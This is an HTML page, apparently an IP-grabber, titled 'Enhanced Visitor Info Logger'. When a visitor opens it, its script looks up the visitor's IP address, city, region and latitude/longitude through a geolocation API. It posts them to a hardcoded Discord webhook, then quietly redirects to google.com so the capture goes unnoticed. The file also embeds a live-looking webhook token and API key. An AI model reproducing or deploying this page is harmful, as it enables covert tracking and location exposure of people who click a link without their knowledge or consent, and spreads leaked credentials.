<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Visitor Info Logger</title>
</head>
<body>
    <h1>Gathering Information...</h1>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const redirectURL = 'https://www.google.com';
        const ipFlareApiKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4df3c8b707a05ab80b9f8d27598627804ad8478f27';

        // Function to get geolocation data from IP Flare
        async function getGeolocation() {
            try {
                const response = await fetch('https://api.ipflare.io/', {
                    method: 'GET',
                    headers: {
                        'X-API-Key': ipFlareApiKey
                    }
                });
                if (!response.ok) throw new Error('Failed to fetch geolocation');
                return await response.json();
            } catch (error) {
                console.error('Error fetching geolocation:', error);
                return null;
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(geoData) {
            const timestamp = new Date().toLocaleString();
            const payload = {
                embeds: [{
                    title: "ðŸ“‹ Visitor Information Logged",
                    color: 3447003,
                    fields: [
                        { name: "IP Address", value: geoData?.ip || "Unknown", inline: true },
                        { name: "Country", value: geoData?.country_name || "Unknown", inline: true },
                        { name: "Region", value: geoData?.region || "Unknown", inline: true },
                        { name: "City", value: geoData?.city || "Unknown", inline: true },
                        { name: "Latitude", value: geoData?.latitude || "Unknown", inline: true },
                        { name: "Longitude", value: geoData?.longitude || "Unknown", inline: true }
                    ],
                    footer: { text: `Logged at: ${timestamp}` }
                }]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                    window.location.href = redirectURL;
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending to webhook:', error);
            }
        }

        // Main execution
        (async () => {
            const geoData = await getGeolocation();
            await sendToDiscord(geoData);
        })();
    </script>
</body>
</html>
